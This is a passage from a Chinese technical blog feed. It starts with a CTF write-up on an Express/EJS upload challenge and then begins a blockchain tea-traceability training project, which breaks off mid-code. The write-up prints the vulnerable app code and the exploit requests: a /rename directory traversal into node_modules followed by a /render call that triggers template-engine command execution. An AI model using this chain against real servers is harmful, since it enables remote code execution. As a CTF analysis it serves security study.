function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`http://localhost:3000`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>upload.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">//省略部分代码</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload a File<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.txt, .pdf, .jpg, .png&quot;</span> <span class="attr">required</span>&gt;</span> <span class="comment">&lt;!-- 允许上传的文件类型 --&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    &lt;% if (typeof errorMessage !== &#x27;undefined&#x27; &amp;&amp; errorMessage) &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span>&lt;%= errorMessage %&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;% &#125; %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>package.json</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;express-file-upload-app&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;ezjs&quot;</span>,</span><br><span class="line">  <span class="string">&quot;main&quot;</span>: <span class="string">&quot;app.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;node app.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;express&quot;</span>: <span class="string">&quot;^4.17.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;express-session&quot;</span>: <span class="string">&quot;^1.17.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;body-parser&quot;</span>: <span class="string">&quot;^1.19.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;multer&quot;</span>: <span class="string">&quot;^1.4.4&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过package.json我们知道express和ejs的版本是存在利用的，配合文件上传实现Express engine处理引擎漏洞，而upload.js虽然限制上传文件类型，但是waf在前端可以抓包直接绕过。</p>
<p>我们重点还是分析app.js</p>
<p><code>/upload</code>路由实现文件上传功能</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;fileInput&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(req.<span class="property">file</span>.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> + req.<span class="property">file</span>.<span class="property">originalname</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>调用<code>extname()</code>函数读取文件拓展名，限制了不准上传拓展名ejs的文件</p>
<p><code>/render</code>实现模板渲染功能</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/render&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(filePath);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>接收参数文件名<code>filename</code>，然后进行拼接成文件路径，如果不为<code>.ejs</code>结尾那么对该文件进行渲染</p>
<p><code>/rename</code>实现重命名文件的功能</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="title class_">IfLogin</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> !== <span class="string">&#x27;ADMIN&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access forbidden&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; oldPath , newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath || !newPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing oldPath or newPath&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newPath &amp;&amp; <span class="regexp">/app\.js|\\|\.ejs/i</span>.<span class="title function_">test</span>(newPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldPath &amp;&amp; <span class="regexp">/\.\.|flag/i</span>.<span class="title function_">test</span>(oldPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line">    <span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (newFilePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;oldPath parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(oldFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Old file not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(newFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">send</span>(<span class="string">&#x27;New file path already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">    fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>接收参数<code>oldPath</code>和<code>newPath</code></p>
<ul>
<li>检查 <code>newPath</code> 是否包含 <code>app.js</code>、<code>\</code>或者 <code>.ejs</code> 扩展名。如果包含这些模式，则返回一个状态码为 400 的错误响应</li>
<li>检查 <code>oldPath</code> 是否包含 <code>..</code> 或者 <code>flag</code> 字符串。如果包含这些模式，则返回一个状态码为 400 的错误响应</li>
</ul>
<p>然后对旧文件名和新文件名分别进行路径拼接，检查文件路径是否以 <code>.ejs</code> 结尾。最后调用<code>rename()</code>对文件名进行重写</p>
<p><strong>代码逻辑梳理清楚后，开始具体实现</strong></p>
<p>我们用<code>ADMIN:123456</code>进行登录，访问<code>/upload</code>上传文件进行抓包，绕过前端检测</p>
<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729203531653.png"></p>
<p>上传成功后，利用<code>/rename</code>路由实现目录穿越，从而把此文件移动到<code>node_modules</code>文件夹</p>
<p>paylaod如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/rename?oldPath=index.js&amp;newPath=../node_modules/aaa/index.js</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729203902624.png"></p>
<p>然后再上传一个<code>.aaa</code>后缀的文件，接着访问<code>/render</code>渲染该文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/render?filename=1.aaa</span><br></pre></td></tr></table></figure>

<p>参数engine里替换成我们的payload，成功命令执行</p>
<blockquote>
<p>当然决赛的时候是不出网的，也就是payload要稍微改一下把执行结果写入到其他文件比如1.ejs内，然后再一次渲染1.ejs即可回显结果</p>
</blockquote>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>vscode调试nodejs</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/108939892">https://zhuanlan.zhihu.com/p/108939892</a></li>
</ul>
<p>漏洞分析</p>
<ul>
<li><a href="https://xz.aliyun.com/t/13512?time__1311=GqmxuDciiQ=05DKy4Cqgz=DkA8n7bD">https://xz.aliyun.com/t/13512?time__1311=GqmxuDciiQ%3D05DKy4Cqgz%3DDkA8n7bD</a></li>
<li><a href="https://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/#ezjs">https://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/#ezjs</a></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>express</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链实训6</title>
    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD6.html</url>
    <content><![CDATA[<p>茶叶产业结合区块链技术的实战项目</p>
<span id="more"></span>

<h2 id="一-项目背景"><a href="#一-项目背景" class="headerlink" title="一. 项目背景"></a>一. 项目背景</h2><h4 id="1-茶叶产业现状"><a href="#1-茶叶产业现状" class="headerlink" title="1. 茶叶产业现状"></a>1. 茶叶产业现状</h4><p>茶叶作为一种传统饮品，在全球范围内享有广泛的消费市场。根据市场研究，茶叶产业的市场规模持续增长，尤其是在中国、印度和其他茶叶生产国。现代消费者对茶叶的需求不仅限于口感和品质，越来越重视产品的来源和生产过程。</p>
<h4 id="2-市场规模"><a href="#2-市场规模" class="headerlink" title="2. 市场规模"></a>2. 市场规模</h4><p>全球茶叶市场的规模在不断扩大，预计在未来几年将继续保持增长。根据市场调研机构的报告，2022年全球茶叶市场规模已经达到数百亿美元，预计到2027年将突破数千亿美元。这一增长受益于健康意识的提高、对天然饮品的偏好以及新兴市场的消费能力提升。</p>
<h4 id="3-常见问题"><a href="#3-常见问题" class="headerlink" title="3. 常见问题"></a>3. 常见问题</h4><ul>
<li><strong>假冒伪劣产品</strong>：茶叶行业面临着假冒伪劣产品的挑战。一些不法商家利用消费者对品牌和质量的认知不足，出售劣质茶叶。这不仅损害了消费者的利益，也影响了整个行业的声誉。</li>
<li><strong>信息不透明</strong>：许多消费者对茶叶的来源、生产工艺和质量标准缺乏清晰的信息，导致他们难以做出明智的消费决策。这种信息的不对称使得消费者对购买的茶叶质量产生疑虑，影响了市场的健康发展。</li>
<li><strong>质量标准不一</strong>：不同地区和品牌的茶叶质量标准不一，缺乏统一的行业规范，导致市场混乱。消费者在购买时难以判断产品的真实质量。</li>
</ul>
<h2 id="二-区块链的作用与局限性"><a href="#二-区块链的作用与局限性" class="headerlink" title="二. 区块链的作用与局限性"></a>二. 区块链的作用与局限性</h2><h3 id="1-茶叶安全与区块链的作用"><a href="#1-茶叶安全与区块链的作用" class="headerlink" title="1. 茶叶安全与区块链的作用"></a>1. 茶叶安全与区块链的作用</h3><ol>
<li><strong>追溯能力</strong>：</li>
</ol>
<ul>
<li><ul>
<li>区块链技术提供的追溯能力确实可以帮助快速定位问题来源。如果发现某批茶叶存在安全隐患，可以通过区块链系统追踪到具体的生产、加工和运输环节，迅速识别出问题所在。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>透明记录</strong>：</li>
</ol>
<ul>
<li><ul>
<li>所有信息都在区块链上记录，确保了数据的透明性和不可篡改性。这意味着消费者和相关方都可以随时查看茶叶的来源和加工信息，从而加强对产品的信任。</li>
</ul>
</li>
</ul>
<h3 id="2-区块链的局限性"><a href="#2-区块链的局限性" class="headerlink" title="2. 区块链的局限性"></a>2. 区块链的局限性</h3><p>虽然区块链能在追溯和信息透明性上提供支持，但它本身并不能直接解决产品质量问题。以下是一些局限性：</p>
<ol>
<li><strong>质量控制在源头</strong>：</li>
</ol>
<ul>
<li><ul>
<li>区块链记录的是已经发生的事件。如果生产商提供的茶叶本身存在质量问题，区块链无法替代质量控制措施。解决质量问题需要从源头加强监管和标准制定。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>后续措施依赖人工</strong>：</li>
</ol>
<ul>
<li><ul>
<li>一旦发现问题，虽然区块链能帮助定位，但后续的处理（如召回、赔偿等）依赖于相关企业或监管机构的行动，而这并非区块链技术本身所能直接控制。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>需要完整的生态系统</strong>：</li>
</ol>
<ul>
<li><ul>
<li>有效的溯源系统需要产业链各方的合作，包括生产商、加工商、物流公司和监管机构。如果某一方不遵循标准或不记录信息，整体的溯源效果将受到影响。</li>
</ul>
</li>
</ul>
<h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h3><p>因此，区块链在食品安全方面的作用主要体现在追溯和透明度上，但解决质量问题仍需要综合的质量管理和监管措施。区块链提供的工具可以有效支持这些措施，但不是解决方案的全部。</p>
<blockquote>
<p>区块链保障数据安全，而不是溯源的商品安全。</p>
</blockquote>
<h2 id="三-项目需求分析"><a href="#三-项目需求分析" class="headerlink" title="三. 项目需求分析"></a>三. 项目需求分析</h2><h3 id="1-用户角色：茶农、加工商、物流公司和消费者"><a href="#1-用户角色：茶农、加工商、物流公司和消费者" class="headerlink" title="1. 用户角色：茶农、加工商、物流公司和消费者"></a>1. 用户角色：茶农、加工商、物流公司和消费者</h3><h3 id="2-功能需求："><a href="#2-功能需求：" class="headerlink" title="2. 功能需求："></a>2. 功能需求：</h3><ul>
<li>茶叶信息登记</li>
<li>生产和加工记录</li>
<li>物流跟踪</li>
<li>消费者查询系统</li>
</ul>
<h3 id="3-架构设计"><a href="#3-架构设计" class="headerlink" title="3. 架构设计"></a>3. 架构设计</h3><p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145505211.png" alt="image-20241102145505211"></p>
<h3 id="4-数据模型"><a href="#4-数据模型" class="headerlink" title="4. 数据模型"></a>4. 数据模型</h3><ol>
<li>区块表：记录区块号，用于区块更新</li>
</ol>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145744871.png" alt="image-20241102145744871"></p>
<ol start="2">
<li>产品表：记录产品信息</li>
</ol>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145823267.png" alt="image-20241102145823267"></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145834063.png" alt="image-20241102145834063"></p>
<ol start="3">
<li>溯源码表：记录溯源码信息</li>
</ol>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145850546.png" alt="image-20241102145850546"></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145856491.png" alt="image-20241102145856491"></p>
<ol start="4">
<li>上链数据表：记录上传到区块链的信息</li>
</ol>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145920479.png" alt="image-20241102145920479"></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145927584.png" alt="image-20241102145927584"></p>
<h2 id="四-技术选型"><a href="#四-技术选型" class="headerlink" title="四. 技术选型"></a>四. 技术选型</h2><h3 id="1-开发工具"><a href="#1-开发工具" class="headerlink" title="1. 开发工具"></a>1. 开发工具</h3><ul>
<li>代码开发工具：IntelliJ IDEA</li>
<li>数据库可视化工具：navicat</li>
<li>接口测试工具：postman</li>
</ul>
<h3 id="2-系统环境"><a href="#2-系统环境" class="headerlink" title="2. 系统环境"></a>2. 系统环境</h3><p>jdk11，mysql8.0.26</p>
<h3 id="3-前端技术"><a href="#3-前端技术" class="headerlink" title="3. 前端技术"></a>3. 前端技术</h3><p>html+css+JavaScript，jquery</p>
<h3 id="4-后端技术"><a href="#4-后端技术" class="headerlink" title="4. 后端技术"></a>4. 后端技术</h3><p>springboot，mybatis</p>
<h2 id="五-代码实现"><a href="#五-代码实现" class="headerlink" title="五. 代码实现"></a>五. 代码实现</h2><p>项目地址：<code>https://gitee.com/daitoulin/suyuan_project.git</code></p>
<h3 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1. 配置文件"></a>1. 配置文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#é¡¹ç®ç«¯å£å·</span><br><span class="line">server.port=8007</span><br><span class="line"></span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/suyuan?useUnicode=true&amp;useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=root</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">### datasource-pool</span><br><span class="line">spring.datasource.type=com.zaxxer.hikari.HikariDataSource</span><br><span class="line">spring.datasource.hikari.minimum-idle=10</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=30</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=30000</span><br><span class="line">spring.datasource.hikari.pool-name=HikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=900000</span><br><span class="line">spring.datasource.hikari.connection-timeout=10000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br><span class="line">spring.datasource.hikari.validation-timeout=1000</span><br><span class="line">spring.servlet.multipart.max-file-size=100MB</span><br><span class="line">spring.servlet.multipart.max-request-size=100MB</span><br><span class="line"></span><br><span class="line">mybatis.mapper-locations=classpath:/mybatis-mapper/*Mapper.xml</span><br><span class="line">mybatis.configuration.map-underscore-to-camel-case=true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">node.ip=192.168.132.1</span><br><span class="line"></span><br><span class="line">spring.thymeleaf.prefix=classpath:/templates/</span><br><span class="line">spring.thymeleaf.mode=HTML</span><br></pre></td></tr></table></figure>

<h3 id="2-启动类"><a href="#2-启动类" class="headerlink" title="2. 启动类"></a>2. 启动类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.suyuan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.EnableScheduling;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.example.suyuan.dao&quot;)</span></span><br><span class="line"><span class="meta">@EnableScheduling</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuyuanApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(SuyuanApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：</p>
<p>@MapperScan(“com.example.suyuan.dao”)<br>扫描这个包下的文件，才能让mybatis正常运行</p>
<p>@EnableScheduling<br>启动定时任务功能</p>
</blockquote>
<h3 id="3-上链接口完整链路"><a href="#3-上链接口完整链路" class="headerlink" title="3. 上链接口完整链路"></a>3. 上链接口完整链路</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mask&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modelBody&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>新增流程<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formItem&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>流程名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;processName&quot;</span> <span class="attr">name</span>=<span class="string">&quot;processName&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;流程名 &quot;</span>  <span class="attr">placeholder</span>=<span class="string">&quot;流程名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formItem&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>流程内容:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;流程内容 &quot;</span>  <span class="attr">placeholder</span>=<span class="string">&quot;流程内容&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btnBox&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn danger&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;closeModal()&quot;</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn primary&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;handleConfirm()&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> loading = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">handleConfirm</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(loading) <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript">        loading = <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> processName = $(<span class="string">&#x27;#processName&#x27;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> content = $(<span class="string">&#x27;#content&#x27;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>: <span class="string">&#x27;/toChain&#x27;</span>, <span class="comment">// API 的 URL 地址</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// 请求类型，可以是 GET, POST, PUT, 